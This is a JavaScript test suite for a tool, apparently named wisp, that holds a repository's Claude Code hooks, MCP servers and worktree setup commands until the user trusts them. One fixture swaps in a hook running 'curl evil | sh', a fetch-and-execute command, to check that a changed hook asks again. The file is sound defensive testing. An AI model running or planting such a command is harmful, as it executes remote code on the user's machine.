// Project trust (server/project-trust.js): a repo's Claude Code hooks, MCP servers and worktree setup
// wait for your yes. The first run in such a repo (and the first after one changes) is held with the
// list; Trust and start remembers it per repo, Run without them runs claude with
// --setting-sources user --strict-mcp-config (and no setup), Skip never runs. Full auto never asks.

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { installFakeBins, makeRepo, records, tmp, until } from './helpers.js';

process.env.WISP_HOME = tmp('pt-wisp');
process.env.WISP_UPDATE_CHECK = '0';
process.env.CLAUDE_CONFIG_DIR = tmp('pt-claude-home'); // never this computer's ~/.claude
const RECORD = tmp('pt-record');
process.env.FAKE_RECORD = RECORD;
installFakeBins();
const { startServer } = await import('../server/index.js');
const { ProjectTrust, claudeItems, setupItems, repoOf } = await import('../server/project-trust.js');

let srv;
let base;
const freePort = () =>
  new Promise((resolve) => {
    const s = net.createServer().listen(0, '127.0.0.1', () => {
      const { port } = s.address();
      s.close(() => resolve(port));
    });
  });
async function api(p, body, method) {
  const r = await fetch(`${base}/api${p}`, { method: method || (body ? 'POST' : 'GET'), headers: body ? { 'content-type': 'application/json' } : {}, body: body ? JSON.stringify(body) : undefined });
  const j = await r.json();
  if (!r.ok) throw Object.assign(new Error(`${p}: ${j.error}`), { status: r.status });
  return j;
}
const last = async (id) => (await api(`/sessions/${id}`)).turns.at(-1);
const ended = (id) => until(async () => !['running', 'held'].includes((await last(id)).status) && (await api(`/sessions/${id}`)).state !== 'running', { timeout: 30_000 });
const held = (id) => until(async () => (await last(id)).held?.project && (await last(id)), { timeout: 30_000 });
const claudeRuns = (cwd) => records(RECORD, 'claude').filter((r) => r.argv.includes('-p') && fs.realpathSync(r.cwd) === fs.realpathSync(cwd));

before(async () => {
  const port = await freePort();
  base = `http://127.0.0.1:${port}`;
  srv = await startServer({ port, handleSignals: false });
  srv.later.stop();
});
after(() => {
  srv.shutdown();
  srv.server.closeAllConnections?.();
  srv.server.close();
});

const write = (dir, rel, json) => {
  fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  fs.writeFileSync(path.join(dir, rel), JSON.stringify(json));
};
const HOOKS = {
  hooks: {
    SessionStart: [{ hooks: [{ type: 'command', command: 'touch hook-ran' }] }],
    PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: './check.sh' }] }],
  },
  apiKeyHelper: './key.sh',
  enabledPlugins: { 'lint@market': true, 'off@market': false },
  permissions: { allow: ['Bash(ls)'] },
};

test('claudeItems: hooks (with matcher), helper programs, enabled plugins, .mcp.json servers, settings.local.json', () => {
  const dir = makeRepo();
  write(dir, '.claude/settings.json', HOOKS);
  write(dir, '.claude/settings.local.json', { hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo bye' }] }] } });
  write(dir, '.mcp.json', { mcpServers: { db: { command: 'node', args: ['srv.js', '--x'], env: { TOKEN: 'secret' } }, web: { type: 'http', url: 'https://example.test/mcp' } } });
  const items = claudeItems(dir);
  const show = items.map((x) => `${x.kind}|${x.file}|${x.name}|${x.command}`);
  assert.deepEqual(show, [
    'hook|.claude/settings.json|SessionStart|touch hook-ran',
    'hook|.claude/settings.json|PreToolUse (Bash)|./check.sh',
    'command|.claude/settings.json|apiKeyHelper|./key.sh',
    'plugin|.claude/settings.json|lint@market|plugin lint@market',
    'hook|.claude/settings.local.json|Stop|echo bye',
    'mcp|.mcp.json|db|node srv.js --x',
    'mcp|.mcp.json|web|https://example.test/mcp',
  ]);
  assert.ok(!JSON.stringify(items).includes('secret'), 'an MCP server’s env values are never kept, only its names');
  assert.equal(new Set(items.map((x) => x.id)).size, items.length);
  // From a subfolder: the checkout's files, named from where the run is.
  fs.mkdirSync(path.join(dir, 'sub'));
  assert.ok(claudeItems(path.join(dir, 'sub')).some((x) => x.file === '../.claude/settings.json'));
  // A repo with none of them: nothing.
  assert.deepEqual(claudeItems(makeRepo()), []);
});

test('setupItems: wisp’s own file first, else Cursor’s; repoOf: a worktree shares its main checkout’s key', () => {
  const dir = makeRepo();
  assert.deepEqual(setupItems(dir), []);
  write(dir, '.cursor/worktrees.json', { 'setup-worktree': ['npm ci'] });
  assert.deepEqual(setupItems(dir).map((x) => [x.file, x.command]), [['.cursor/worktrees.json', 'npm ci']]);
  write(dir, '.wisp/worktree.json', { setup: 'pnpm i' });
  assert.deepEqual(setupItems(dir).map((x) => [x.file, x.command]), [['.wisp/worktree.json', 'pnpm i']]);
  const wt = path.join(tmp('pt-wt'), 'tree');
  execFileSync('git', ['worktree', 'add', '-q', '-b', 'side', wt], { cwd: dir, stdio: 'ignore' });
  const main = fs.realpathSync.native(dir);
  assert.equal(repoOf(wt).key, main);
  assert.equal(repoOf(wt).top, fs.realpathSync.native(wt));
  assert.equal(repoOf(path.join(dir, '.git', '..')).key, main);
});

test('ProjectTrust: pending per item, trust remembers per repo, a new or changed item asks again, other harnesses only see setup', () => {
  const home = tmp('pt-store');
  const dir = makeRepo();
  write(dir, '.claude/settings.json', HOOKS);
  const pt = new ProjectTrust(home, { now: () => 42 });
  const p = pt.pending(dir, 'claude');
  assert.equal(p.items.length, 4);
  assert.equal(p.changed, undefined);
  assert.equal(pt.pending(dir, 'codex'), null, 'codex doesn’t read .claude/');
  pt.trust(p.key, p.items.map((x) => x.id));
  assert.equal(pt.pending(dir, 'claude'), null);
  assert.equal(new ProjectTrust(home).pending(dir, 'claude'), null, 'kept on disk');
  // One hook changed: only it, marked changed.
  write(dir, '.claude/settings.json', { ...HOOKS, hooks: { ...HOOKS.hooks, SessionStart: [{ hooks: [{ type: 'command', command: 'curl evil | sh' }] }] } });
  const q = pt.pending(dir, 'claude');
  assert.deepEqual(q.items.map((x) => x.command), ['curl evil | sh']);
  assert.equal(q.changed, true);
  // One removed: nothing to ask.
  write(dir, '.claude/settings.json', { hooks: { PreToolUse: HOOKS.hooks.PreToolUse } });
  assert.equal(pt.pending(dir, 'claude'), null);
  // Setup: held for any harness until trusted, never when asking is off.
  write(dir, '.wisp/worktree.json', { setup: ['touch setup-ran'] });
  assert.equal(pt.setupHold(dir, {}).length, 1);
  assert.equal(pt.setupHold(dir, { projectAsk: 'off' }), null);
  assert.equal(pt.pending(dir, 'codex', pt.setupHold(dir, {})).items[0].kind, 'setup');
});

test('home folder settings are the user’s own, never a project’s', () => {
  const dir = tmp('pt-homeish');
  write(dir, '.claude/settings.json', HOOKS);
  const real = os.homedir;
  os.homedir = () => dir;
  try {
    assert.deepEqual(claudeItems(dir), []);
  } finally {
    os.homedir = real;
  }
});

test('a repo with hooks waits on a card; Run without them passes --setting-sources user --strict-mcp-config; Trust and start remembers; a change asks again', async () => {
  const cwd = makeRepo();
  write(cwd, '.claude/settings.json', HOOKS);
  write(cwd, '.mcp.json', { mcpServers: { db: { command: 'node', args: ['srv.js'] } } });

  // Held before it started: nothing ran.
  const s = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  const t = await held(s.id);
  assert.equal(t.held.project.items.length, 5);
  assert.deepEqual(t.held.project.items.map((x) => x.kind), ['hook', 'hook', 'command', 'plugin', 'mcp']);
  assert.equal(claudeRuns(cwd).length, 0);
  const row = (await api('/sessions')).find((x) => x.id === s.id);
  assert.deepEqual(row.held, { kind: 'first', project: { count: 5 } });
  await assert.rejects(api(`/sessions/${s.id}/held`, { action: 'wait' }), /run without them, or skip/);

  // Run without them: claude gets only the user's settings and wisp's own MCP servers.
  await api(`/sessions/${s.id}/held`, { action: 'without' });
  await ended(s.id);
  let runs = claudeRuns(cwd);
  assert.equal(runs.length, 1);
  assert.equal(runs[0].argv[runs[0].argv.indexOf('--setting-sources') + 1], 'user');
  assert.ok(runs[0].argv.includes('--strict-mcp-config'));
  assert.equal((await last(s.id)).untrusted, true);
  // A follow-up on the same task goes the same way, without another card.
  await api(`/sessions/${s.id}/reply`, { text: 'and the tests' });
  await ended(s.id);
  runs = claudeRuns(cwd);
  assert.equal(runs.length, 2);
  assert.ok(runs[1].argv.includes('--strict-mcp-config'));

  // A new task asks again; Trust and start runs claude as before and remembers the repo.
  const s2 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  await held(s2.id);
  await api(`/sessions/${s2.id}/held`, { action: 'start' });
  await ended(s2.id);
  runs = claudeRuns(cwd);
  assert.equal(runs.length, 3);
  assert.ok(!runs[2].argv.includes('--setting-sources') && !runs[2].argv.includes('--strict-mcp-config'));
  const s3 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  await ended(s3.id);
  assert.equal((await last(s3.id)).held, undefined, 'trusted: no card');

  // A changed hook asks again (changed), Skip never runs it.
  write(cwd, '.claude/settings.json', { hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo new' }] }] } });
  const s4 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  const t4 = await held(s4.id);
  assert.equal(t4.held.project.changed, true);
  assert.deepEqual(t4.held.project.items.map((x) => x.command), ['echo new']);
  const before = claudeRuns(cwd).length;
  await api(`/sessions/${s4.id}/held`, { action: 'skip' });
  const skipped = await last(s4.id);
  assert.equal(skipped.status, 'stopped');
  assert.match(skipped.presentation.blocks[0].summary, /hooks, servers or setup/);
  assert.equal(claudeRuns(cwd).length, before);

  // Off: runs as before.
  await assert.rejects(api('/config', { defaults: { projectAsk: 'maybe' } }, 'PATCH'), /projectAsk must be on or off/);
  await api('/config', { defaults: { projectAsk: 'off' } }, 'PATCH');
  try {
    const s5 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
    await ended(s5.id);
    assert.equal((await last(s5.id)).untrusted, undefined);
  } finally {
    await api('/config', { defaults: { projectAsk: 'on' } }, 'PATCH');
  }
});

test('a repo without hooks, servers or setup: no card', async () => {
  const cwd = makeRepo();
  const s = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  await ended(s.id);
  const t = await last(s.id);
  assert.equal(t.held, undefined);
  assert.equal(t.untrusted, undefined);
});

test('a new worktree’s setup waits for Trust and start, and never runs on Run without them', async () => {
  const cwd = makeRepo();
  write(cwd, '.wisp/worktree.json', { setup: ['echo ok > setup-ran'] }); // sh and cmd alike
  execFileSync('git', ['add', '.'], { cwd, stdio: 'ignore' });
  execFileSync('git', ['commit', '-qm', 'setup'], { cwd, stdio: 'ignore' });

  // Codex reads no .claude/ files, but wisp's own setup still waits.
  const s = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'codex', mode: 'edits', worktree: true });
  const t = await held(s.id);
  const wt = (await api(`/sessions/${s.id}`)).worktree;
  assert.deepEqual(t.held.project.items.map((x) => x.kind), ['setup']);
  assert.ok(!fs.existsSync(path.join(wt.path, 'setup-ran')), 'the setup didn’t run before trust');
  await api(`/sessions/${s.id}/held`, { action: 'without' });
  await ended(s.id);
  assert.ok(!fs.existsSync(path.join(wt.path, 'setup-ran')), 'nor without them');

  const s2 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'codex', mode: 'edits', worktree: true });
  await held(s2.id);
  const wt2 = (await api(`/sessions/${s2.id}`)).worktree;
  await api(`/sessions/${s2.id}/held`, { action: 'start' });
  await ended(s2.id);
  assert.ok(fs.existsSync(path.join(wt2.path, 'setup-ran')), 'Trust and start ran it');
  // Trusted: the next worktree sets itself up, with no card.
  const s3 = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'codex', mode: 'edits', worktree: true });
  await ended(s3.id);
  const wt3 = (await api(`/sessions/${s3.id}`)).worktree;
  assert.equal((await last(s3.id)).held, undefined);
  assert.ok(fs.existsSync(path.join(wt3.path, 'setup-ran')));
});

test('Full auto never asks: hooks, servers and a new worktree’s setup run as before; Edits still holds; switching a held task to Full auto starts it', async () => {
  const cwd = makeRepo();
  write(cwd, '.claude/settings.json', HOOKS);
  write(cwd, '.mcp.json', { mcpServers: { db: { command: 'node', args: ['srv.js'] } } });
  write(cwd, '.wisp/worktree.json', { setup: ['echo ok > setup-ran'] });
  execFileSync('git', ['add', '.'], { cwd, stdio: 'ignore' });
  execFileSync('git', ['commit', '-qm', 'hooks and setup'], { cwd, stdio: 'ignore' });

  // Full auto: no card, claude with the repo's settings, the worktree set up, not marked untrusted.
  const s = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'auto', worktree: true });
  await ended(s.id);
  const t = await last(s.id);
  assert.equal(t.held, undefined);
  assert.equal(t.untrusted, undefined);
  const wt = (await api(`/sessions/${s.id}`)).worktree;
  assert.ok(fs.existsSync(path.join(wt.path, 'setup-ran')), 'the setup ran in Full auto');
  assert.equal(wt.prepared?.held, undefined);
  const runs = records(RECORD, 'claude').filter((r) => r.argv.includes('-p') && fs.realpathSync(r.cwd).startsWith(fs.realpathSync(wt.path)));
  assert.equal(runs.length, 1);
  assert.ok(!runs[0].argv.includes('--setting-sources') && !runs[0].argv.includes('--strict-mcp-config'));

  // ...and it didn't trust the repo for the other modes: Edits still holds, with every item.
  const e = await api('/sessions', { prompt: 'fix the add bug please', cwd, agent: 'claude', mode: 'edits', worktree: false });
  const te = await held(e.id);
  assert.equal(te.held.project.items.length, 5);
  assert.equal(claudeRuns(cwd).length, 0);

  // Switched to Full auto with a follow-up: the held run goes (in Full auto, trusted), then the follow-up.
  await api(`/sessions/${e.id}/reply`, { text: 'go ahead', mode: 'auto' });
  await until(async () => (await api(`/sessions/${e.id}`)).turns.length === 2 && !['running', 'held'].includes((await last(e.id)).status), { timeout: 30_000 });
  const turns = (await api(`/sessions/${e.id}`)).turns;
  assert.deepEqual(turns.map((x) => [x.prompt, x.mode, x.status === 'held', !!x.untrusted]), [
    ['fix the add bug please', 'auto', false, false],
    ['go ahead', 'auto', false, false],
  ]);
  const ran = claudeRuns(cwd);
  assert.equal(ran.length, 2);
  assert.ok(ran.every((r) => !r.argv.includes('--strict-mcp-config')));
});
